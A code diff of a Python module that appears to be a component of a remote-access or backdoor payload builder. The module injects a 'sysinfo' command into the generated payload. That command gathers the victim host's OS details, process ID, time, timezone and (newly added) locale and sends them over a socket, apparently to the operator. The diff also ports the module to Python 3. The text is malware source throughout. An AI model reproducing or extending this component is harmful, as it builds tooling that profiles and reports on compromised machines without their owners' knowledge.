@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -11,6 +10,7 @@ def main(option):
         config.import_statements.append('from os import getpid')
         config.import_statements.append('from datetime import datetime')
         config.import_statements.append('from time import gmtime, strftime')
+        config.import_statements.append('from locale import getdefaultlocale')
         config.functions.append('''
 def sysinfo():
     platform_uname = uname()
@@ -28,14 +28,15 @@ def sysinfo():
     data += '   Process ID     : ' + str(getpid()) + '\\n'
     data += '   System time    : ' + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + '\\n'
     data += '   Timezone       : ' + str(strftime("%z", gmtime())) + '\\n'
-    s.sendall(data)''')
+    data += '   Language       : ' + str(' '.join(getdefaultlocale())) + '\\n'
+    s.sendall(data.encode())''')
         config.logics.append('''
             elif command == "sysinfo":
                 sysinfo()''')
         config.help_menu['sysinfo'] = 'Grabs system info and displays it'
     elif option == 'info':
-        print '\nName             : System Information Grabber component' \
+        print('\nName             : System Information Grabber component' \
               '\nOS               : Windows' \
-              '\nRequired Modules : platform, socket, os, datetime, time' \
+              '\nRequired Modules : platform, socket, os, datetime, time, locale' \
               '\nCommands         : sysinfo' \
-              '\nDescription      : Grabs system info and displays it\n'
+              '\nDescription      : Grabs system info and displays it\n')
